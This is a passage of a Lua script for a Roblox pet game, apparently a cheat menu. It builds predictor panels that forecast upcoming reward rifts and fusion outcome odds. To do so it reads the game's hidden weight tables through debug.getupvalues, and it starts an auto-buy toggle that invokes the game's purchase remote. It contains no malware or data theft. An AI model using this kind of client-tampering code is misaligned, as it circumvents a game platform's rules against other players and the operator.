				v13.Set({ Visible = true, Text = arg })
				table.insert(tbl10, { Kind = "text", Handle = v13, Gap = arg2 })
			end

			local function fn35(arg, arg2)
				local flag3 = #tbl10 > 0
				fn34(string.format("<b><font color=\"%s\">%s</font></b>", arg2, arg), flag3)
			end

			local function fn36()
				n27 += 1
				local v13 = fn17(n27)
				v13.Frame.Set({ Visible = true })
				table.insert(tbl10, { Kind = "slot", Slot = v13 })
				return v13
			end

			local serverTimeNow = workspace:GetServerTimeNow()
			local n28 = tonumber(fn20("RotationSeconds")) or 10800
			local n29 = math.floor(serverTimeNow / n28)
			local clears = tbl12.Clears

			if os.clock() >= clears then
				tbl12.Clears = os.clock() + 60
				table.clear(tbl12.Banner)
				table.clear(tbl12.Odds)
				table.clear(tbl12.Chance)
			end

			local v13 = fn22(n29)

			if type(v11) ~= "table" or v13 == nil then
				fn32(nil)
				fn34(bold(paint(color2.Hint, "Rift data is not available yet")), false)
			else
				fn32(v13, serverTimeNow, n28)
				local v14 = v12

				if type(v14) == "table" and v14.BannerId == v13 and type(v14.Requirements) == "table" and #v14.Requirements > 0 then
					fn35("CURRENT RECIPE", color2.Text)
					local tbl13 = {}

					for _, requirement in ipairs(v14.Requirements) do
						local v15 = tbl6.AssetInfo(requirement)
						local insert = table.insert
						local v16 = table.pack(bold(paint(v15.Hex, tbl6.Escape(v15.Name))))
						insert(tbl13, table.unpack(v16, 1, v16.n))
					end

					fn34(table.concat(tbl13, tbl6.Separator()), false)
				end

				fn35("REWARD ODDS" .. tbl6.Separator() .. string.upper(fn21(v13)), fn19(v13))
				local v15 = fn26(v13)

				for i, v16 in ipairs(v15) do
					local v17 = tbl6.AssetInfo(v16.AssetId)
					local v18 = fn36()
					v18.Icon.Set({ Visible = v17.Icon ~= nil, Image = v17.Icon or "", StrokeColor = v17.Color })
					v18.Name.Set({ Text = tbl6.Escape(v17.Name) })

					v18.Rarity.Set({
						Text = string.upper(tostring(v17.Rarity)),
						Color = fn10(v17),
						Gradient = fn9(v17),
						GradientRotation = fn11(v17),
					})

					v18.Status.Set({ Text = fn29(v16.Chance) })
					local v19 = fn30(v16.Chance)

					if i == #v15 then
						v19 ..= tbl6.Separator() .. bold(paint(color2.Clock, "Chase pet"))
					end

					v18.Detail.Set({ Text = v19 })
				end

				fn35("UPCOMING RIFTS", color2.Text)

				for i = 1, 6 do
					local v16 = fn22(n29 + i)
					local n30 = (n29 + i) * n28
					local v17 = fn36()
					local GetBannerEggIcon = fn20("GetBannerEggIcon", v16)
					local v18 = fn19(v16)

					v17.Icon.Set({
						Visible = type(GetBannerEggIcon) == "string" and GetBannerEggIcon ~= "",
						Image = type(GetBannerEggIcon) == "string" and GetBannerEggIcon or "",
						StrokeColor = Color3.fromHex(v18),
					})

					v17.Name.Set({ Text = tbl6.Escape(fn21(v16)) })
					v17.Rarity.Set({ Text = i == 1 and "NEXT" or "#" .. i, Color = Color3.fromHex(v18), Gradient = nil })
					v17.Status.Set({ Text = bold(paint(color2.Clock, "in " .. fn28(n30 - serverTimeNow))) })
					local v19 = fn26(v16)
					local v20 = v19[#v19]
					local str = paint(color2.Hint, "Starts ") .. paint(color2.Text, fn27(n30))

					if v20 then
						local v21 = tbl6.AssetInfo(v20.AssetId)
						str ..= tbl6.Separator() .. paint(color2.Hint, "Chase ") .. bold(paint(v21.Hex, tbl6.Escape(v21.Name))) .. " " .. fn29(v20.Chance)
					end

					v17.Detail.Set({ Text = str })
				end

				fn35("NEXT TIME EACH RIFT OPENS", color2.Text)
				local v16 = ipairs
				local banners = v11.Banners or {}

				for _, banner in v16(banners) do
					local v17 = fn19(banner.Id)
					local v18 = table.pack(tbl6.Escape(fn21(banner.Id)))
					local v19 = paint
					v18.n = 2 + v18.n - 1
					table.move(v18, 1, v18.n, 2, v18)
					v18[1] = v17
					local v20 = bold(v19(table.unpack(v18, 1, v18.n)))
					local str

					if banner.Id == v13 then
						str = v20 .. tbl6.Separator() .. bold(paint(color2.Ready, "Open now"))
					else
						local v21 = nil

						for i = 1, 2000 do
							local id = banner.Id

							if fn22(n29 + i) == id then
								v21 = i
								break
							else
								v21 = nil
							end
						end

						if v21 then
							local n30 = (n29 + v21) * n28
							str = v20 .. tbl6.Separator() .. bold(paint(color2.Clock, "in " .. fn28(n30 - serverTimeNow))) .. tbl6.Separator() .. paint(color2.Text, fn27(n30))
						else
							str = v20 .. tbl6.Separator() .. paint(color2.Hint, "Not soon")
						end
					end

					fn34(str .. tbl6.Separator() .. paint(color2.Hint, "chance ") .. fn29(fn24(banner.Id)), false)
				end
			end

			for i = n26 + 1, #tbl9 do
				tbl9[i].Set({ Visible = false })
			end

			for i = n27 + 1, #tbl8 do
				tbl8[i].Frame.Set({ Visible = false })
			end

			fn18()
			n4 = 2
		end

		if not tbl6.Ready then
			v7:CreateText({
				Name = "Rift Predictor",
				Text = "Update the Chilli Library to use the predictor canvas.",
			})
		else
			local v13 = v7:CreateCanvas({
				Name = "Rift Predictor",
				Layout = "free",
				Style = {
					TextScale = 0.84,
					LineHeight = 1.1,
					MinLines = 16,
					MaxLines = 34,
					BackgroundTransparency = 0.5,
					ScrollBarColor = Color3.fromRGB(170, 174, 184),
					TextColor = Color3.fromRGB(255, 255, 255),
					TextStrokeTransparency = 0.7,
				},
				Build = function(arg)
					fn12(arg)
					pcall(fn33)
				end,
			})

			fn4(function()
				v13:Destroy()
			end)

			local n26 = 1

			local connection = RunService.Heartbeat:Connect(function(deltaTime)
				if not v10 or not tbl6.PageVisible() or not tbl6.IsShown(v10:Root()) then
					return
				end
				fn31()
				n26 += deltaTime

				if n26 >= 1 then
					n26 = 0
					pcall(fn33)
				end

				if n4 > 0 or flag then
					if n4 > 0 then
						n4 -= 1
					end

					pcall(fn18)
				end
			end)

			fn4(function()
				connection:Disconnect()
			end)
		end
	end

	local paint2, bold2, color3, n5, n6, n7, n8, n9, n10, n11
	local n12, n13, n14, n15, v11

	do
		local tbl11 = {
			{ min = 0.85, max = 1.05, weight = 2000 },
			{ min = 1.45, max = 1.55, weight = 250 },
			{ min = 1.9, max = 2.1, weight = 125 },
			{ min = 2.85, max = 3.15, weight = 62.5 },
			{ min = 3.8, max = 4.2, weight = 31.25 },
			{ min = 0.3, max = 0.45, weight = 18 },
			{ min = 0.1, max = 0.2, weight = 5 },
			{ min = 5.8, max = 6.2, weight = 15.625 },
			{ min = 9.5, max = 12.5, weight = 3 },
			{ min = 12, max = 17, weight = 0.05 },
			{ min = 20, max = 35, weight = 0.0001 },
		}

		paint2 = tbl6.Paint
		bold2 = tbl6.Bold
		color3 = tbl6.Color
		n5 = 5
		n6 = n5 + 0.8
		n7 = 1.2
		n8 = 1.2
		n9 = 0.936
		n10 = 2.3
		n11 = 0.25
		n12 = 0.18
		n13 = n10 + 0.6
		n14 = 0.24
		n15 = 0.22
		local n16 = 0.0909
		v11 = nil
		local tbl12 = {}
		local tbl13 = {}
		local tbl14 = {}
		local tbl15 = {}
		local n17 = 0
		local n18 = 0
		local n19 = 0.06
		local n20 = -1
		local n21 = -1
		local n22 = -1
		local n23 = 4
		local n24 = 3
		local flag2 = false
		local n25 = 0
		local v12 = nil

		local tbl16 = {
			{ Min = 0, Color = "#8F98A8" },
			{ Min = 0.3, Color = "#C6CDDA" },
			{ Min = 0.85, Color = "#FFFFFF" },
			{ Min = 1.45, Color = "#7CFF9E" },
			{ Min = 1.9, Color = "#4FE0FF" },
			{ Min = 2.85, Color = "#6FA0FF" },
			{ Min = 3.8, Color = "#C08BFF" },
			{ Min = 5.8, Color = "#FF9A3D" },
			{ Min = 9.5, Color = "#FF5C5C" },
			{ Min = 12, Color = "#FFD34D" },
			{ Min = 20, Color = "#FF4DE8" },
		}

		local function fn13(arg)
			local n26 = -math.huge
			local str = "#FFFFFF"

			for _, v13 in ipairs(tbl16) do
				if arg + 0.001 >= v13.Min and v13.Min > n26 then
					str = v13.Color
					n26 = v13.Min
				end
			end

			return str
		end

		local function fn14(arg, arg2)
			local eggRecords = tbl.EggRecords
			if type(eggRecords) ~= "table" or type(eggRecords.WeightKgForScale) ~= "function" then
				return nil
			end
			local ok, result = pcall(eggRecords.WeightKgForScale, arg, arg2)
			if ok and type(result) == "number" and result > 0 then
				return result
			end
			return nil
		end

		local function fn15(arg)
			if type(arg) ~= "table" or #arg == 0 then
				return nil
			end
			local n26 = -math.huge
			local v13 = nil

			for _, v14 in ipairs(arg) do
				local v15 = tbl6.MutationMultiplier({ v14 })

				if v15 > n26 then
					n26 = v15
					v13 = v14
				end
			end

			return v13
		end

		local function fn16()
			if v12 then
				return v12
			end
			local eggRecords = tbl.EggRecords
			local getupvalues_ = type(debug) == "table" and debug.getupvalues or getupvalues

			if type(eggRecords) == "table" and type(eggRecords.DrawAssetScale) == "function" and type(getupvalues_) == "function" then
				local ok, result = pcall(getupvalues_, eggRecords.DrawAssetScale)

				if ok and type(result) == "table" then
					for _, v13 in pairs(result) do
						if type(v13) == "table" and type(v13[1]) == "table" and v13[1].min and v13[1].weight then
							v12 = v13
							break
						end
					end
				end
			end

			v12 = v12 or tbl11
			return v12
		end

		local function fn17(arg, arg2, arg3)
			local fuseKernel = tbl.FuseKernel

			if type(fuseKernel) == "table" and type(fuseKernel.BandWeightBias) == "function" then
				local ok, result = pcall(fuseKernel.BandWeightBias, arg, arg2, arg3)
				if ok and type(result) == "number" then
					return result
				end
			end

			return math.exp(math.log((arg[1] + arg[2] + arg[3]) / 3) / 0.69314718055994529 * math.log((arg2 + arg3) / 2) / 0.69314718055994529 * 0.6)
		end

		local function fn18()
			local save = tbl.Save
			if type(save) ~= "table" or type(save.Get) ~= "function" then
				return nil
			end
			local ok, result = pcall(save.Get)
			if not ok or type(result) ~= "table" then
				return nil
			end
			local fusionSlots = type(result.FusionSlots) == "table" and result.FusionSlots or {}
			local inventory = type(result.Inventory) == "table" and result.Inventory or {}
			local tbl17 = {}

			for i = 1, 3 do
				local v13 = fusionSlots[i]
				local flag3 = v13 ~= nil and inventory[v13] or nil

				if type(flag3) == "table" then
					table.insert(tbl17, {
						Category = flag3.Category,
						Scale = tonumber(flag3.Scale) or 1,
						Mutations = type(flag3.Mutations) == "table" and flag3.Mutations or {},
					})
				end
			end

			return {
				Items = tbl17,
				Locked = result.FusionLocked == true,
				Duration = tonumber(result.FusionDuration) or 0,
				Reward = result.FusionEggReward ~= nil and result.FusionEggReward ~= false,
			}
		end

		local function fn19(arg)
			if string.upper(tostring(arg.Rarity)) == "SECRET" then
				return tbl6.SecretGradient
			end
			return arg.Gradient
		end

		local function fn20(arg)
			return fn19(arg) ~= nil and Color3.fromRGB(255, 255, 255) or arg.Color
		end

		local function fn21(arg)
			if string.upper(tostring(arg.Rarity)) == "SECRET" then
				return tbl6.SecretRotation
			end
			return nil
		end

		local function fn22(arg)
			v11 = arg
			arg:SetDock(5, { Gap = n15, DividerColor = Color3.fromRGB(170, 174, 184) })
			local v13 = arg:Dock()

			tbl12.Icon = arg:Image({
				Parent = v13,
				X = 0,
				Y = 0,
				Width = n5,
				Height = n5,
				Corner = 0.35,
				Background = "#000000",
				BackgroundTransparency = 0.26,
				StrokeThickness = n16,
				StrokeTransparency = 0,
				ZIndex = 8,
			})

			tbl12.Name = arg:Text({
				Parent = v13,
				X = n6,
				Y = 0,
				Height = n7,
				Scale = n8,
				Wrap = false,
				Gradient = tbl6.NameGradient,
				TextStrokeTransparency = 1,
				ZIndex = 9,
			})

			tbl12.Rarity = arg:Text({
				Parent = v13,
				X = n6,
				Y = 0,
				Height = n7,
				Scale = n9,
				Wrap = false,
				Font = tbl6.RarityFont,
				TextStrokeTransparency = 1,
				StrokeTransparency = 0.08,
				ZIndex = 9,
			})

			tbl12.Info = arg:Text({ Parent = v13, X = n6, Y = n7, Height = n5 - n7, Wrap = false, ZIndex = 9 })

			arg:OnResize(function(arg2, arg3, arg4)
				if arg3 == n20 and arg4 == n21 then
					return
				end
				n20 = arg3
				n21 = arg4
				n17 = arg3 / math.max(arg4, 1)
				n18 = arg4
				n25 = 2
				n19 = 0.9 / math.max(arg:TextSize(), 1)
				tbl12.Rarity.Set({ StrokeThickness = n19 })

				for _, v14 in ipairs(tbl13) do
					v14.Rarity.Set({ StrokeThickness = n19 })
				end
			end)
		end

		local function fn23(arg)
			local v13 = arg and arg.Get()
			if not v13 or n18 <= 0 then
				return nil
			end

			if v13.Text ~= tostring(arg.Spec.Text or "") then
				return nil
			end
			return v13
		end

		local function fn24(arg)
			local v13 = fn23(arg)
			if not v13 then
				return nil
			end
			local size = v13.Size
			local textWrapped = v13.TextWrapped
			v13.TextWrapped = false
			v13.Size = UDim2.fromOffset(100000, math.max(1, size.Y.Offset))
			local x = v13.TextBounds.X
			v13.Size = size
			v13.TextWrapped = textWrapped
			if x <= 0 then
				return nil
			end
			return x / n18
		end

		local function fn25(arg, arg2)
			local v13 = fn23(arg)
			if not v13 then
				return nil
			end
			local size = v13.Size
			v13.Size = UDim2.fromOffset(math.max(1, math.floor(arg2 * n18 + 0.5)), 100000)
			local y = v13.TextBounds.Y
			v13.Size = size
			if y <= 0 then
				return nil
			end
			return y / n18
		end

		local function fn26(arg)
			local v13 = tbl14[arg]

			if not v13 then
				local v14 = v11:Text({ Name = "Line", X = 0, Y = 0, Width = 1, Height = 1, Wrap = true, Visible = false })
				tbl14[arg] = v14
				v13 = v14
			end

			return v13
		end

		local function fn27(arg)
			local v13 = tbl13[arg]
			if v13 then
				return v13
			end

			local tbl17 = {
				Frame = v11:Frame({
					Name = "Slot",
					Background = "#000000",
					BackgroundTransparency = 0.74,
					Corner = 0.35,
					X = 0,
					Y = 0,
					Width = 1,
					Height = 1,
					Visible = false,
				}),
			}

			tbl17.Icon = v11:Image({
				Parent = tbl17.Frame,
				X = n11,
				Y = 0,
				Width = n10,
				Height = n10,
				Corner = 0.35,
				Background = "#000000",
				BackgroundTransparency = 0.45,
				StrokeThickness = n16,
				StrokeTransparency = 0,
			})

			tbl17.Name = v11:Text({
				Parent = tbl17.Frame,
				X = n11 + n13,
				Y = 0,
				Width = 1,
				Height = n7,
				Scale = n8,
				Wrap = false,
				Gradient = tbl6.NameGradient,
				TextStrokeTransparency = 1,
			})

			tbl17.Rarity = v11:Text({
				Parent = tbl17.Frame,
				X = n11 + n13,
				Y = 0,
				Width = 1,
				Height = n7,
				Scale = n9,
				Wrap = false,
				Font = tbl6.RarityFont,
				TextStrokeTransparency = 1,
				StrokeTransparency = 0.08,
				StrokeThickness = n19,
			})

			tbl17.Detail = v11:Text({
				Parent = tbl17.Frame,
				X = n11 + n13,
				Y = n7,
				Width = math.max(1, n17 - n13 - n11 * 2),
				Height = 1,
				Wrap = true,
			})

			tbl17.Status = v11:Text({
				Parent = tbl17.Frame,
				X = 0,
				Y = 0,
				Width = 1,
				Height = n7,
				Wrap = false,
				Align = "Right",
				Color = color3.Hint,
			})

			tbl13[arg] = tbl17
			return tbl17
		end

		local function fn28()
			if n17 <= 0 then
				return
			end
			flag2 = false
			local n26 = math.max(1, n17 - n6)
			local v13 = fn24(tbl12.Rarity)

			if v13 then
				n24 = v13 + 0.1
			else
				flag2 = true
			end

			local v14 = fn24(tbl12.Name)

			if v14 then
				n23 = math.min(v14 + 0.1, math.max(1, n26 - n24 - n14))
			else
				flag2 = true
			end

			tbl12.Name.Set({ X = n6, Y = 0, Width = n23, Height = n7 })

			tbl12.Rarity.Set({
				X = n6 + n23 + n14,
				Y = 0,
				Width = math.max(0.5, math.min(n24, n26 - n23 - n14)),
				Height = n7,
			})

			tbl12.Info.Set({ X = n6, Y = n7, Width = n26, Height = math.max(1, n5 - n7) })
			local n27 = math.max(1, n17 - n13 - n11 * 2)
			local n28 = 0

			for _, v15 in ipairs(tbl15) do
				if v15.Kind == "text" then
					local handle = v15.Handle
					local v16 = fn25(handle, n17)

					if v16 then
						v15.Height = v16
					else
						flag2 = true
					end

					local n29 = math.max(1, v15.Height or 1)
					handle.Set({ X = 0, Y = n28 + (v15.Gap and 0.5 or 0), Width = n17, Height = n29 })
					n28 += n29 + n15 * 0.5 + (v15.Gap and 0.5 or 0)
				else
					local slot = v15.Slot
					local v16 = fn25(slot.Detail, n27)

					if v16 then
						slot.DetailUnits = v16
					else
						flag2 = true
					end

					local n29 = math.clamp(slot.DetailUnits or 1, 1, 4)
					local v17 = fn24(slot.Status)

					if v17 then
						slot.StatusUnits = v17 + 0.23
					else
						flag2 = true
					end

					local n30 = math.min(n27 * 0.42, math.max(2.73, slot.StatusUnits or 2.73))
					local n31 = math.max(1, n27 - n30 - n14)
					local v18 = fn24(slot.Rarity)

					if v18 then
						slot.RarityUnits = v18 + 0.1
					else
						flag2 = true
					end

					local n32 = math.min(slot.RarityUnits or 3, n31 * 0.5)
					local v19 = fn24(slot.Name)

					if v19 then
						slot.NameUnits = v19 + 0.1
					else
						flag2 = true
					end

					local min = math.min
					local max = math.max
					local nameUnits = slot.NameUnits or 4
					local max2 = math.max
					local n33 = n31 - n32 - n14
					local v20 = min(max(1, nameUnits), max2(1, n33))
					local n34 = n12 * 2
					local n35 = math.max(n29 + n7, 2.3) + n34
					local n36 = (n35 - n29 - n7) / 2
					slot.Frame.Set({ X = 0, Y = n28, Width = n17, Height = n35 })
					slot.Icon.Set({ Y = (n35 - n10) / 2 })
					slot.Name.Set({ X = n11 + n13, Y = n36, Width = v20 })
					slot.Rarity.Set({ X = n11 + n13 + v20 + n14, Y = n36, Width = math.max(0.5, n32) })
					slot.Detail.Set({ X = n11 + n13, Y = n36 + n7, Width = n27, Height = n29 })
					slot.Status.Set({ X = n11 + n13 + n27 - n30, Y = n36, Width = math.max(0.5, n30) })
					n28 += n35 + n15
				end
			end

			local n29 = math.max(1, n28)

			if math.abs(n29 - n22) > 0.01 then
				n22 = n29
				v11:SetContentLines(n29)
			end
		end

		local function fn29(arg, arg2)
			local flag3 = arg ~= nil
			v11:SetDock(flag3 and 5 or 0, { Gap = n15 })
			tbl12.Icon.Set({ Visible = flag3 })
			tbl12.Name.Set({ Visible = flag3 })
			tbl12.Rarity.Set({ Visible = flag3 })
			tbl12.Info.Set({ Visible = flag3 })
			if not flag3 then
				return
			end
			tbl12.Icon.Set({ Visible = arg.Icon ~= nil, Image = arg.Icon or "", StrokeColor = arg.Color })
			tbl12.Name.Set({ Text = tbl6.Escape(arg.Name) })

			tbl12.Rarity.Set({
				Text = string.upper(tostring(arg.Rarity)),
				Color = fn20(arg),
				Gradient = fn19(arg),
				GradientRotation = fn21(arg),
			})

			local v13 = paint2(color3.Text, string.format("Fusing %d of 3 pets", #arg2.Items))

			if arg2.Reward then
				v13 = bold2(paint2(color3.Ready, "Fuse finished, claim your egg"))
			elseif arg2.Locked then
				local n26 = arg2.Duration > 1e9 and arg2.Duration - workspace:GetServerTimeNow() or 0
				v13 = bold2(paint2(color3.Clock, n26 > 0 and "Fusing" .. tbl6.Separator() .. tbl6.FormatClock(n26) or "Fusing"))
			end

			local set = tbl12.Info.Set
			local tbl17 = {}
			local concat = table.concat
			local tbl18 = {}
			local v14 = bold2(paint2(color3.Income, tbl6.FormatRate(tbl6.Income(arg, arg2.Items[1].Scale, arg2.Items[1].Mutations))))
			local v15 = paint2(color3.Text, string.format("%d/3 loaded", #arg2.Items))
			tbl18[1] = v14
			tbl18[2] = v15
			tbl18[3] = v13
			tbl17.Text = concat(tbl18, "\n")
			set(tbl17)
		end

		local function refreshFuse()
			if not v11 then
				return
			end
			n25 = 2
			table.clear(tbl15)
			local n26 = 0

			local function fn30(arg, arg2)
				n26 += 1
				local v13 = fn26(n26)
				v13.Set({ Visible = true, Text = arg })
				table.insert(tbl15, { Kind = "text", Handle = v13, Gap = arg2 })
			end

			local function fn31(arg, arg2)
				local flag3 = #tbl15 > 0
				fn30(string.format("<b><font color=\"%s\">%s</font></b>", arg2, arg), flag3)
			end

			local v13 = fn18()
			local n27

			if not v13 then
				fn29(nil, nil)
				fn30(bold2(paint2(color3.Hint, "Fuse machine data is not available yet")), false)
				n27 = 0
			elseif #v13.Items == 0 then
				fn29(nil, nil)
				fn30(bold2(paint2(color3.Text, "Machine is empty")), false)
				fn30(paint2(color3.Hint, "Load 3 pets of the same species to see the result odds"), false)
				n27 = 0
			else
				local items = v13.Items
				local v14 = tbl6.AssetInfo(items[1].Category)
				fn29(v14, v13)
				local text = color3.Text
				fn31(string.format("FUSE MACHINE STATUS (%d/3 PETS)", #items), text)
				fn30(paint2(color3.Hint, "Species") .. "  " .. bold2(paint2(v14.Hex, "[" .. string.upper(tostring(v14.Rarity)) .. "]")) .. " " .. bold2(paint2(color3.Text, tbl6.Escape(v14.Name))), false)
				n27 = 0

				for i = 1, 3 do
					local v15 = items[i]
					n27 += 1
					local v16 = fn27(n27)
					v16.Frame.Set({ Visible = true })
					v16.Status.Set({ Text = "SLOT " .. i })

					if v15 then
						v16.Icon.Set({ Visible = v14.Icon ~= nil, Image = v14.Icon or "", StrokeColor = v14.Color })
						v16.Name.Set({ Text = tbl6.Escape(v14.Name) })

						v16.Rarity.Set({
							Text = string.upper(tostring(v14.Rarity)),
							Color = fn20(v14),
							Gradient = fn19(v14),
							GradientRotation = fn21(v14),
						})

						local v17 = fn14(v15.Category, v15.Scale)
						local v18 = bold2(paint2(color3.Scale, string.format("%.2fx", v15.Scale)))

						if v17 then
							v18 ..= tbl6.Separator() .. paint2(color3.Weight, tbl6.FormatWeight(v17))
						end

						local str = v18 .. tbl6.Separator() .. bold2(paint2(color3.Income, tbl6.FormatRate(tbl6.Income(v14, v15.Scale, v15.Mutations))))
						local v19 = tbl6.MutationText(v15.Mutations)

						v16.Detail.Set({
							Text = str .. tbl6.Separator() .. (v19 ~= "" and v19 or paint2(color3.Hint, "Normal")),
						})
					else
						v16.Icon.Set({ Visible = false })
						v16.Name.Set({ Text = paint2(color3.Hint, "Empty") })
						v16.Rarity.Set({ Text = "", Gradient = nil })
						v16.Detail.Set({ Text = paint2(color3.Hint, "Add a pet to this slot") })
					end

					table.insert(tbl15, { Kind = "slot", Slot = v16 })
				end

				local n28 = 0

				for _, item in ipairs(items) do
					n28 += item.Scale
				end

				local n29 = n28 / #items
				local v15 = fn14(items[1].Category, n29)
				local str = paint2(color3.Hint, "Average Scale") .. "  " .. bold2(paint2(color3.Scale, string.format("%.2fx", n29)))

				if v15 then
					str ..= tbl6.Separator() .. paint2(color3.Weight, tbl6.FormatWeight(v15))
				end

				fn30(str, false)
				local v16 = nil

				for _, item in ipairs(items) do
					local v17 = fn15(item.Mutations)

					if v17 then
						if (v16 and tbl6.MutationMultiplier({ v16 }) or 0) < tbl6.MutationMultiplier({ v17 }) then
							v16 = v17
						end
					end
				end

				local tbl17 = v16 and { v16 } or {}
				fn31("PREDICTED SIZE PROBABILITIES", color3.Income)

				if #items == 3 then
					local tbl18 = { items[1].Scale, items[2].Scale, items[3].Scale }
					local tbl19 = {}
					local n30 = 0

					for _, v17 in ipairs(fn16()) do
						local n31 = v17.weight * fn17(tbl18, v17.min, v17.max)
						n30 += n31
						table.insert(tbl19, { Min = v17.min, Max = v17.max, Weight = n31, Color = fn13(v17.min) })
					end

					table.sort(tbl19, function(arg, arg2)
						return arg.Weight > arg2.Weight
					end)

					local v17 = tbl19[1]

					for _, v18 in ipairs(tbl19) do
						local n31 = n30 > 0 and v18.Weight / n30 * 100 or 0
						local v19 = bold2(paint2(v18.Color, string.format("%.2fx - %.2fx", v18.Min, v18.Max)))
						local v20 = fn14(items[1].Category, v18.Min)
						local v21 = fn14(items[1].Category, v18.Max)

						if v20 and v21 then
							local weight = color3.Weight
							local format = string.format
							local formatWeight = tbl6.FormatWeight
							v19 ..= tbl6.Separator() .. paint2(weight, format("%s - %s", tbl6.FormatWeight(v20), formatWeight(v21)))
						end

						fn30(v19 .. tbl6.Separator() .. bold2(paint2(n31 >= 10 and color3.Income or n31 >= 1 and color3.Clock or color3.Hint, string.format(n31 >= 1 and "%.1f%%" or "%.3f%%", n31))), false)
					end

					fn31("RESULT PREDICTION", color3.Text)
					fn30(paint2(color3.Hint, "Predicted Mutation") .. "  " .. (v16 and tbl6.MutationText(tbl17) or paint2(color3.Text, "Normal")), false)

					if v17 then
						fn30(paint2(color3.Hint, "Estimated Value") .. "  " .. bold2(paint2(color3.Income, tbl6.FormatRate(tbl6.Income(v14, v17.Min, tbl17)) .. " ~ " .. tbl6.FormatRate(tbl6.Income(v14, v17.Max, tbl17)))) .. tbl6.Separator() .. paint2(color3.Hint, "at ") .. bold2(paint2(v17.Color, string.format("%.2fx - %.2fx", v17.Min, v17.Max))), false)
					end

					local v18, v19, v20 = ipairs(tbl19)
					local v21 = nil

					for _, v22 in v18, v19, v20 do
						if not v21 or v22.Max > v21.Max then
							v21 = v22
						end
					end

					if v21 then
						fn30(paint2(color3.Hint, "Best Case") .. "  " .. bold2(paint2(v21.Color, string.format("%.2fx - %.2fx", v21.Min, v21.Max))) .. "  " .. bold2(paint2(color3.Income, tbl6.FormatRate(tbl6.Income(v14, v21.Max, tbl17)))), false)
					end
				else
					fn30(paint2(color3.Hint, string.format("Load %d more of the same species to see the odds", 3 - #v13.Items)), false)
				end
			end

			for i = n26 + 1, #tbl14 do
				tbl14[i].Set({ Visible = false })
			end

			for i = n27 + 1, #tbl13 do
				tbl13[i].Frame.Set({ Visible = false })
			end

			fn28()
			n25 = 2
		end

		if not tbl6.Ready then
			v8:CreateText({
				Name = "Fuse Predictor",
				Text = "Update the Chilli Library to use the predictor canvas.",
			})
		else
			local v13 = v8:CreateCanvas({
				Name = "Fuse Predictor",
				Layout = "free",
				Style = {
					TextScale = 0.84,
					LineHeight = 1.1,
					MinLines = 16,
					MaxLines = 34,
					BackgroundTransparency = 0.5,
					ScrollBarColor = Color3.fromRGB(170, 174, 184),
					TextColor = Color3.fromRGB(255, 255, 255),
					TextStrokeTransparency = 0.7,
				},
				Build = function(arg)
					fn22(arg)

					if type(tbl6.RequestEggRefresh) == "function" then
						tbl6.RequestEggRefresh()
					end
				end,
			})

			tbl6.RefreshFuse = refreshFuse

			tbl6.PlaceFuse = function()
				if n25 > 0 or flag2 then
					if n25 > 0 then
						n25 -= 1
					end

					pcall(fn28)
				end
			end

			fn4(function()
				v13:Destroy()
			end)
		end
	end

	local v12
	v12 = v2:CreateTab({ Name = "Progress", SectionsExpanded = true }):CreateSection({ Name = "Auto Progression", Expanded = true })

	do
		local tbl11 = {}
		local tbl12

		tbl12 = {
			Remote = function(arg)
				local v13 = tbl11[arg]
				if v13 ~= nil then
					return v13 or nil
				end
				local v14 = networking:FindFirstChild(arg)
				tbl11[arg] = v14 or false
				return v14
			end,
			Invoke = function(arg, ...)
				local v13 = tbl12.Remote(arg)
				if not v13 or not v13:IsA("RemoteFunction") then
					return false, nil
				end
				local ok, result = pcall(v13.InvokeServer, v13, ...)
				return ok, result
			end,
			Fire = function(arg, ...)
				local v13 = tbl12.Remote(arg)
				if not v13 or not v13:IsA("RemoteEvent") then
					return false
				end
				return pcall(v13.FireServer, v13, ...)
			end,
		}

		local function saveData()
			local save = tbl.Save
			if type(save) ~= "table" or type(save.Get) ~= "function" then
				return nil
			end
			local ok, result = pcall(save.Get)
			return ok and type(result) == "table" and result or nil
		end

		tbl12.SaveData = saveData
		local tbl13 = { "Money", "Cash", "Coins", "Currency", "Balance" }

		tbl12.Money = function()
			local v13 = saveData()

			if v13 then
				for _, v14 in ipairs(tbl13) do
					local num = tonumber(v13[v14])
					if num then
						return num
					end
				end
			end

			local leaderstats = localPlayer:FindFirstChild("leaderstats")

			if leaderstats then
				for _, v14 in ipairs(tbl13) do
					local v15 = leaderstats:FindFirstChild(v14)
					if v15 and tonumber(v15.Value) then
						return tonumber(v15.Value)
					end
				end
			end

			return nil
		end

		tbl12.AddWorker = tbl3.Add
		tbl12.Backoff = tbl3.Backoff

		local tbl14 = {
			"Money",
			"BaseUpgradeLevel",
			"TreadmillUpgradeLevel",
			"TrailInventory",
			"PendingOfflineMoney",
		}

		local save = tbl.Save

		if type(save) == "table" and type(save.FieldSignal) == "function" then
			for _, v13 in ipairs(tbl14) do
				local ok, result = pcall(save.FieldSignal, v13)

				if ok and type(result) == "table" and type(result.Connect) == "function" then
					local ok2, result2 = pcall(result.Connect, result, function()
						tbl3.Wake()
					end)

					if ok2 and result2 then
						fn4(function()
							pcall(function()
								result2:Disconnect()
							end)
						end)
					end
				end
			end
		end

		local v13 = nil
		local v14 = nil
		local tbl15 = {}

		local function fn13()
			local v15 = fn2(function()
				return ReplicatedStorage.Data.Trails
			end)

			local directory = type(v15) == "table" and v15.Directory or nil
			if type(directory) ~= "table" then
				return {}
			end
			local tbl16 = {}

			for k, v16 in pairs(directory) do
				if type(v16) == "table" then
					local insert = table.insert
					local tbl17 = {}
					local v17 = tostring
					k = v16._id or k
					tbl17.Id = v17(k)
					tbl17.Price = tonumber(v16.Price) or math.huge
					insert(tbl16, tbl17)
				end
			end

			table.sort(tbl16, function(arg, arg2)
				return arg.Price < arg2.Price
			end)

			return tbl16
		end

		local function fn14(arg)
			if not tbl5.ReadToggle(v13, false) then
				return false
			end
			v14 = v14 or fn13()
			local v15 = tbl12.SaveData()
			if not v15 or #v14 == 0 then
				return false
			end
			local trailInventory = type(v15.TrailInventory) == "table" and v15.TrailInventory or {}
			local n16 = tonumber(v15.Money) or 0

			for _, v16 in ipairs(v14) do
				if trailInventory[v16.Id] ~= true and not tbl15[v16.Id] and v16.Price <= n16 then
					local AskPurchase, v17 = tbl12.Invoke("RF/Trailwear/AskPurchase", v16.Id)
					if AskPurchase and v17 ~= false then
						return true
					end
					tbl15[v16.Id] = true
					tbl12.Backoff(arg)
					return false
				end
			end

			return false
		end

		v13 = v12:CreateToggle({
			Name = "Auto Buy Trail",
			Note = "Automatically buy available trails when affordable",
			Default = false,
			Callback = function()
